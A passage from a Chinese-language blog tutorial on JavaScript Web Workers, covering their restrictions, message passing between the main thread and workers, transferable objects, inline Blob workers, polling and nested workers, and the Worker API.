<p>（1）<strong>同源限制</strong></p>
<p>分配给 Worker 线程运行的脚本文件，必须与主线程的脚本文件同源。</p>
<p>（2）<strong>DOM 限制</strong></p>
<p>Worker 线程所在的全局对象，与主线程不一样，无法读取主线程所在网页的 DOM 对象，也无法使用<code>document</code>、<code>window</code>、<code>parent</code>这些对象。但是，Worker 线程可以使用<code>navigator</code>对象和<code>location</code>对象。</p>
<p>（3）<strong>全局对象限制</strong></p>
<p>Worker 的全局对象<code>WorkerGlobalScope</code>，不同于网页的全局对象<code>Window</code>，很多接口拿不到。比如，理论上 Worker 线程不能使用<code>console.log</code>，因为标准里面没有提到 Worker 的全局对象存在<code>console</code>接口，只定义了<code>Navigator</code>接口和<code>Location</code>接口。不过，浏览器实际上支持 Worker 线程使用<code>console.log</code>，保险的做法还是不使用这个方法。</p>
<p>（4）<strong>通信联系</strong></p>
<p>Worker 线程和主线程不在同一个上下文环境，它们不能直接通信，必须通过消息完成。</p>
<p>（5）<strong>脚本限制</strong></p>
<p>Worker 线程不能执行<code>alert()</code>方法和<code>confirm()</code>方法，但可以使用 XMLHttpRequest 对象发出 AJAX 请求。</p>
<p>（6）<strong>文件限制</strong></p>
<p>Worker 线程无法读取本地文件，即不能打开本机的文件系统（<code>file://</code>），它所加载的脚本，必须来自网络。</p>
<h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><h4 id="主线程"><a href="#主线程" class="headerlink" title="主线程"></a>主线程</h4><p>主线程采用<code>new</code>命令，调用<code>Worker()</code>构造函数，新建一个 Worker 线程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var worker &#x3D; new Worker(&#39;work.js&#39;);</span><br></pre></td></tr></table></figure>

<p><code>Worker()</code>构造函数的参数是一个脚本文件，该文件就是 Worker 线程所要执行的任务。由于 Worker 不能读取本地文件，所以这个脚本必须来自网络。如果下载没有成功（比如404错误），Worker 就会默默地失败。</p>
<p>然后，主线程调用<code>worker.postMessage()</code>方法，向 Worker 发消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">worker.postMessage(&#39;Hello World&#39;);</span><br><span class="line">worker.postMessage(&#123;method: &#39;echo&#39;, args: [&#39;Work&#39;]&#125;);</span><br></pre></td></tr></table></figure>

<p><code>worker.postMessage()</code>方法的参数，就是主线程传给 Worker 的数据。它可以是各种数据类型，包括二进制数据。</p>
<p>接着，主线程通过<code>worker.onmessage</code>指定监听函数，接收子线程发回来的消息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">worker.onmessage &#x3D; function (event) &#123;</span><br><span class="line">  doSomething(event.data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function doSomething() &#123;</span><br><span class="line">  &#x2F;&#x2F; 执行任务</span><br><span class="line">  worker.postMessage(&#39;Work done!&#39;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，事件对象的<code>data</code>属性可以获取 Worker 发来的数据。</p>
<p>Worker 完成任务以后，主线程就可以把它关掉。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">worker.terminate();</span><br></pre></td></tr></table></figure>

<h4 id="Worker-线程"><a href="#Worker-线程" class="headerlink" title="Worker 线程"></a>Worker 线程</h4><p>Worker 线程内部需要有一个监听函数，监听<code>message</code>事件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(&#39;message&#39;, function (e) &#123;</span><br><span class="line">  self.postMessage(&#39;You said: &#39; + e.data);</span><br><span class="line">&#125;, false);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>self</code>代表子线程自身，即子线程的全局对象。因此，等同于下面两种写法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 写法一</span><br><span class="line">this.addEventListener(&#39;message&#39;, function (e) &#123;</span><br><span class="line">  this.postMessage(&#39;You said: &#39; + e.data);</span><br><span class="line">&#125;, false);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 写法二</span><br><span class="line">addEventListener(&#39;message&#39;, function (e) &#123;</span><br><span class="line">  postMessage(&#39;You said: &#39; + e.data);</span><br><span class="line">&#125;, false);</span><br></pre></td></tr></table></figure>

<p>除了使用<code>self.addEventListener()</code>指定监听函数，也可以使用<code>self.onmessage</code>指定。监听函数的参数是一个事件对象，它的<code>data</code>属性包含主线程发来的数据。<code>self.postMessage()</code>方法用来向主线程发送消息。</p>
<p>根据主线程发来的数据，Worker 线程可以调用不同的方法，下面是一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">self.addEventListener(&#39;message&#39;, function (e) &#123;</span><br><span class="line">  var data &#x3D; e.data;</span><br><span class="line">  switch (data.cmd) &#123;</span><br><span class="line">    case &#39;start&#39;:</span><br><span class="line">      self.postMessage(&#39;WORKER STARTED: &#39; + data.msg);</span><br><span class="line">      break;</span><br><span class="line">    case &#39;stop&#39;:</span><br><span class="line">      self.postMessage(&#39;WORKER STOPPED: &#39; + data.msg);</span><br><span class="line">      self.close(); &#x2F;&#x2F; Terminates the worker.</span><br><span class="line">      break;</span><br><span class="line">    default:</span><br><span class="line">      self.postMessage(&#39;Unknown command: &#39; + data.msg);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;, false);</span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>self.close()</code>用于在 Worker 内部关闭自身。</p>
<h4 id="Worker-加载脚本"><a href="#Worker-加载脚本" class="headerlink" title="Worker 加载脚本"></a>Worker 加载脚本</h4><p>Worker 内部如果要加载其他脚本，有一个专门的方法<code>importScripts()</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">importScripts(&#39;script1.js&#39;);</span><br></pre></td></tr></table></figure>

<p>该方法可以同时加载多个脚本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">importScripts(&#39;script1.js&#39;, &#39;script2.js&#39;);</span><br></pre></td></tr></table></figure>

<h4 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h4><p>主线程可以监听 Worker 是否发生错误。如果发生错误，Worker 会触发主线程的<code>error</code>事件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">worker.onerror &#x3D; function (event) &#123;</span><br><span class="line">  console.log(</span><br><span class="line">    &#39;ERROR: Line &#39;, event.lineno, &#39; in &#39;, event.filename, &#39;: &#39;, event.message</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 或者</span><br><span class="line">worker.addEventListener(&#39;error&#39;, function (event) &#123;</span><br><span class="line">  &#x2F;&#x2F; ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>Worker 内部也可以监听<code>error</code>事件。</p>
<h4 id="关闭-Worker"><a href="#关闭-Worker" class="headerlink" title="关闭 Worker"></a>关闭 Worker</h4><p>使用完毕，为了节省系统资源，必须关闭 Worker。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 主线程</span><br><span class="line">worker.terminate();</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Worker 线程</span><br><span class="line">self.close();</span><br></pre></td></tr></table></figure>

<h3 id="数据通信"><a href="#数据通信" class="headerlink" title="数据通信"></a>数据通信</h3><p>前面说过，主线程与 Worker 之间的通信内容，可以是文本，也可以是对象。需要注意的是，这种通信是拷贝关系，即是传值而不是传址，Worker 对通信内容的修改，不会影响到主线程。事实上，浏览器内部的运行机制是，先将通信内容串行化，然后把串行化后的字符串发给 Worker，后者再将它还原。</p>
<p>主线程与 Worker 之间也可以交换二进制数据，比如 File、Blob、ArrayBuffer 等类型，也可以在线程之间发送。下面是一个例子。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 主线程</span><br><span class="line">var uInt8Array &#x3D; new Uint8Array(new ArrayBuffer(10));</span><br><span class="line">for (var i &#x3D; 0; i &lt; uInt8Array.length; ++i) &#123;</span><br><span class="line">  uInt8Array[i] &#x3D; i * 2; &#x2F;&#x2F; [0, 2, 4, 6, 8,...]</span><br><span class="line">&#125;</span><br><span class="line">worker.postMessage(uInt8Array);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Worker 线程</span><br><span class="line">self.onmessage &#x3D; function (e) &#123;</span><br><span class="line">  var uInt8Array &#x3D; e.data;</span><br><span class="line">  postMessage(&#39;Inside worker.js: uInt8Array.toString() &#x3D; &#39; + uInt8Array.toString());</span><br><span class="line">  postMessage(&#39;Inside worker.js: uInt8Array.byteLength &#x3D; &#39; + uInt8Array.byteLength);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>但是，拷贝方式发送二进制数据，会造成性能问题。比如，主线程向 Worker 发送一个 500MB 文件，默认情况下浏览器会生成一个原文件的拷贝。为了解决这个问题，JavaScript 允许主线程把二进制数据直接转移给子线程，但是一旦转移，主线程就无法再使用这些二进制数据了，这是为了防止出现多个线程同时修改数据的麻烦局面。这种转移数据的方法，叫做<a href="https://www.w3.org/html/wg/drafts/html/master/infrastructure.html#transferable-objects" target="_blank" rel="noopener">Transferable Objects</a>。这使得主线程可以快速把数据交给 Worker，对于影像处理、声音处理、3D 运算等就非常方便了，不会产生性能负担。</p>
<p>如果要直接转移数据的控制权，就要使用下面的写法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Transferable Objects 格式</span><br><span class="line">worker.postMessage(arrayBuffer, [arrayBuffer]);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 例子</span><br><span class="line">var ab &#x3D; new ArrayBuffer(1);</span><br><span class="line">worker.postMessage(ab, [ab]);</span><br></pre></td></tr></table></figure>

<h3 id="同页面的-Web-Worker"><a href="#同页面的-Web-Worker" class="headerlink" title="同页面的 Web Worker"></a>同页面的 Web Worker</h3><p>通常情况下，Worker 载入的是一个单独的 JavaScript 脚本文件，但是也可以载入与主线程在同一个网页的代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script id&#x3D;&quot;worker&quot; type&#x3D;&quot;app&#x2F;worker&quot;&gt;</span><br><span class="line">      addEventListener(&#39;message&#39;, function () &#123;</span><br><span class="line">        postMessage(&#39;some message&#39;);</span><br><span class="line">      &#125;, false);</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>上面是一段嵌入网页的脚本，注意必须指定<code>&lt; script&gt;</code>标签的<code>type</code>属性是一个浏览器不认识的值，上例是<code>app/worker</code>。</p>
<p>然后，读取这一段嵌入页面的脚本，用 Worker 来处理。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var blob &#x3D; new Blob([document.querySelector(&#39;#worker&#39;).textContent]);</span><br><span class="line">var url &#x3D; window.URL.createObjectURL(blob);</span><br><span class="line">var worker &#x3D; new Worker(url);</span><br><span class="line"></span><br><span class="line">worker.onmessage &#x3D; function (e) &#123;</span><br><span class="line">  &#x2F;&#x2F; e.data &#x3D;&#x3D;&#x3D; &#39;some message&#39;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>上面代码中，先将嵌入网页的脚本代码，转成一个二进制对象，然后为这个二进制对象生成 URL，再让 Worker 加载这个 URL。这样就做到了，主线程和 Worker 的代码都在同一个网页上面。</p>
<h3 id="实例：Worker-线程完成轮询"><a href="#实例：Worker-线程完成轮询" class="headerlink" title="实例：Worker 线程完成轮询"></a>实例：Worker 线程完成轮询</h3><p>有时，浏览器需要轮询服务器状态，以便第一时间得知状态改变。这个工作可以放在 Worker 里面。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">function createWorker(f) &#123;</span><br><span class="line">  var blob &#x3D; new Blob([&#39;(&#39; + f.toString() + &#39;)()&#39;]);</span><br><span class="line">  var url &#x3D; window.URL.createObjectURL(blob);</span><br><span class="line">  var worker &#x3D; new Worker(url);</span><br><span class="line">  return worker;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var pollingWorker &#x3D; createWorker(function (e) &#123;</span><br><span class="line">  var cache;</span><br><span class="line"></span><br><span class="line">  function compare(new, old) &#123; ... &#125;;</span><br><span class="line"></span><br><span class="line">  setInterval(function () &#123;</span><br><span class="line">    fetch(&#39;&#x2F;my-api-endpoint&#39;).then(function (res) &#123;</span><br><span class="line">      var data &#x3D; res.json();</span><br><span class="line"></span><br><span class="line">      if (!compare(data, cache)) &#123;</span><br><span class="line">        cache &#x3D; data;</span><br><span class="line">        self.postMessage(data);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;, 1000)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">pollingWorker.onmessage &#x3D; function () &#123;</span><br><span class="line">  &#x2F;&#x2F; render data</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pollingWorker.postMessage(&#39;init&#39;);</span><br></pre></td></tr></table></figure>

<p>上面代码中，Worker 每秒钟轮询一次数据，然后跟缓存做比较。如果不一致，就说明服务端有了新的变化，因此就要通知主线程。</p>
<h3 id="实例：-Worker-新建-Worker"><a href="#实例：-Worker-新建-Worker" class="headerlink" title="实例： Worker 新建 Worker"></a>实例： Worker 新建 Worker</h3><p>Worker 线程内部还能再新建 Worker 线程（目前只有 Firefox 浏览器支持）。下面的例子是将一个计算密集的任务，分配到10个 Worker。</p>
<p>主线程代码如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var worker &#x3D; new Worker(&#39;worker.js&#39;);</span><br><span class="line">worker.onmessage &#x3D; function (event) &#123;</span><br><span class="line">  document.getElementById(&#39;result&#39;).textContent &#x3D; event.data;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>Worker 线程代码如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; worker.js</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; settings</span><br><span class="line">var num_workers &#x3D; 10;</span><br><span class="line">var items_per_worker &#x3D; 1000000;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; start the workers</span><br><span class="line">var result &#x3D; 0;</span><br><span class="line">var pending_workers &#x3D; num_workers;</span><br><span class="line">for (var i &#x3D; 0; i &lt; num_workers; i +&#x3D; 1) &#123;</span><br><span class="line">  var worker &#x3D; new Worker(&#39;core.js&#39;);</span><br><span class="line">  worker.postMessage(i * items_per_worker);</span><br><span class="line">  worker.postMessage((i + 1) * items_per_worker);</span><br><span class="line">  worker.onmessage &#x3D; storeResult;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; handle the results</span><br><span class="line">function storeResult(event) &#123;</span><br><span class="line">  result +&#x3D; event.data;</span><br><span class="line">  pending_workers -&#x3D; 1;</span><br><span class="line">  if (pending_workers &lt;&#x3D; 0)</span><br><span class="line">    postMessage(result); &#x2F;&#x2F; finished!</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，Worker 线程内部新建了10个 Worker 线程，并且依次向这10个 Worker 发送消息，告知了计算的起点和终点。计算任务脚本的代码如下。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; core.js</span><br><span class="line">var start;</span><br><span class="line">onmessage &#x3D; getStart;</span><br><span class="line">function getStart(event) &#123;</span><br><span class="line">  start &#x3D; event.data;</span><br><span class="line">  onmessage &#x3D; getEnd;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var end;</span><br><span class="line">function getEnd(event) &#123;</span><br><span class="line">  end &#x3D; event.data;</span><br><span class="line">  onmessage &#x3D; null;</span><br><span class="line">  work();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function work() &#123;</span><br><span class="line">  var result &#x3D; 0;</span><br><span class="line">  for (var i &#x3D; start; i &lt; end; i +&#x3D; 1) &#123;</span><br><span class="line">    &#x2F;&#x2F; perform some complex calculation here</span><br><span class="line">    result +&#x3D; 1;</span><br><span class="line">  &#125;</span><br><span class="line">  postMessage(result);</span><br><span class="line">  close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="API"><a href="#API" class="headerlink" title="API"></a>API</h3><h4 id="主线程-1"><a href="#主线程-1" class="headerlink" title="主线程"></a>主线程</h4><p>浏览器原生提供<code>Worker()</code>构造函数，用来供主线程生成 Worker 线程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var myWorker &#x3D; new Worker(jsUrl, options);</span><br></pre></td></tr></table></figure>

<p><code>Worker()</code>构造函数，可以接受两个参数。第一个参数是脚本的网址（必须遵守同源政策），该参数是必需的，且只能加载 JS 脚本，否则会报错。第二个参数是配置对象，该对象可选。它的一个作用就是指定 Worker 的名称，用来区分多个 Worker 线程。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 主线程</span><br><span class="line">var myWorker &#x3D; new Worker(&#39;worker.js&#39;, &#123; name : &#39;myWorker&#39; &#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Worker 线程</span><br><span class="line">self.name &#x2F;&#x2F; myWorker</span><br></pre></td></tr></table></figure>

<p><code>Worker()</code>构造函数返回一个 Worker 线程对象，用来供主线程操作 Worker。Worker 线程对象的属性和方法如下。</p>
<ul>
<li>Worker.onerror：指定 error 事件的监听函数。</li>
<li>Worker.onmessage：指定 message 事件的监听函数，发送过来的数据在<code>Event.data</code>属性中。</li>
<li>Worker.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。</li>
<li>Worker.postMessage()：向 Worker 线程发送消息。</li>
<li>Worker.terminate()：立即终止 Worker 线程。</li>
</ul>
<h4 id="Worker-线程-1"><a href="#Worker-线程-1" class="headerlink" title="Worker 线程"></a>Worker 线程</h4><p>Web Worker 有自己的全局对象，不是主线程的<code>window</code>，而是一个专门为 Worker 定制的全局对象。因此定义在<code>window</code>上面的对象和方法不是全部都可以使用。</p>
<p>Worker 线程有一些自己的全局属性和方法。</p>
<ul>
<li>self.name： Worker 的名字。该属性只读，由构造函数指定。</li>
<li>self.onmessage：指定<code>message</code>事件的监听函数。</li>
<li>self.onmessageerror：指定 messageerror 事件的监听函数。发送的数据无法序列化成字符串时，会触发这个事件。</li>
<li>self.close()：关闭 Worker 线程。</li>
<li>self.postMessage()：向产生这个 Worker 的线程发送消息。</li>
<li>self.importScripts()：加载 JS 脚本。</li>
</ul>
</div><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">PanXiaoKang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/10/17/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/">http://example.com/2021/10/17/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">向阳榆木</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/JavaScript/">JavaScript</a><a class="post-meta__tags" href="/tags/%E5%89%8D%E7%AB%AF%E7%9F%A5%E8%AF%86/">前端知识</a><a class="post-meta__tags" href="/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%9E%8B/">浏览器模型</a></div><div class="post_share"><div class="social-share" data-image="https://mpimg.cn/view.php/58dfeb8921e8fb4a93de3dae7d99a816.jpg" data-sites="qq,wechat,facebook,twitter,weibo"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"/><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button button--primary button--animated"> <i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lazyload post-qr-code__img" src="https://s1.ax1x.com/2020/06/09/t40mLD.th.png" alt="微信"/><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lazyload post-qr-code__img" src="https://s1.ax1x.com/2020/06/09/t4czVK.th.jpg" alt="支付宝"/><div class="post-qr-code__desc">支付宝</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull_left"><a href="/2021/11/07/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E7%BD%91%E9%A1%B5%E5%85%83%E7%B4%A0%E6%8E%A5%E5%8F%A3/"><img class="prev_cover lazyload" data-src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&amp;fm=26&amp;gp=0.jpg" onerror="onerror=null;src='/img/404.png'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info"> ⑧JavaScript教程之网页元素接口</div></div></a></div><div class="next-post pull_right"><a href="/2021/10/04/JavaScript%E6%95%99%E7%A8%8B%E4%B9%8B%E4%BA%8B%E4%BB%B6/"><img class="next_cover lazyload" data-src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&amp;fm=26&amp;gp=0.jpg" onerror="onerror=null;src='/img/404.png'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">⑥JavaScript教程之事件</div></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2021/11/07/JavaScript教程之网页元素接口/" title=" ⑧JavaScript教程之网页元素接口"><img class="relatedPosts_cover lazyload"data-src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&fm=26&gp=0.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2021-11-07</div><div class="relatedPosts_title"> ⑧JavaScript教程之网页元素接口</div></div></a></div><div class="relatedPosts_item"><a href="/2021/10/04/JavaScript教程之事件/" title="⑥JavaScript教程之事件"><img class="relatedPosts_cover lazyload"data-src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&fm=26&gp=0.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2021-10-04</div><div class="relatedPosts_title">⑥JavaScript教程之事件</div></div></a></div><div class="relatedPosts_item"><a href="/2021/09/21/JavaScript教程之DOM/" title="⑤JavaScript教程之DOM"><img class="relatedPosts_cover lazyload"data-src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&fm=26&gp=0.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2021-09-21</div><div class="relatedPosts_title">⑤JavaScript教程之DOM</div></div></a></div><div class="relatedPosts_item"><a href="/2021/09/17/JavaScript教程之面向对象编程/" title="④JavaScript教程之面向对象编程"><img class="relatedPosts_cover lazyload"data-src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&fm=26&gp=0.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2021-09-17</div><div class="relatedPosts_title">④JavaScript教程之面向对象编程</div></div></a></div><div class="relatedPosts_item"><a href="/2021/08/29/JavaScript教程之标准库/" title="③JavaScript教程之标准库"><img class="relatedPosts_cover lazyload"data-src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&fm=26&gp=0.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2021-08-29</div><div class="relatedPosts_title">③JavaScript教程之标准库</div></div></a></div><div class="relatedPosts_item"><a href="/2021/05/04/JavaScript从进阶到熟悉/" title="②JavaScript从进阶到熟悉"><img class="relatedPosts_cover lazyload"data-src="https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1273994899,2704080463&fm=26&gp=0.jpg"><div class="relatedPosts_main is-center"><div class="relatedPosts_date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 2021-05-04</div><div class="relatedPosts_title">②JavaScript从进阶到熟悉</div></div></a></div></div><div class="clear_both"></div></div><hr><div id="post-comment"><div class="comment_headling"><i class="fa fa-comments fa-fw" 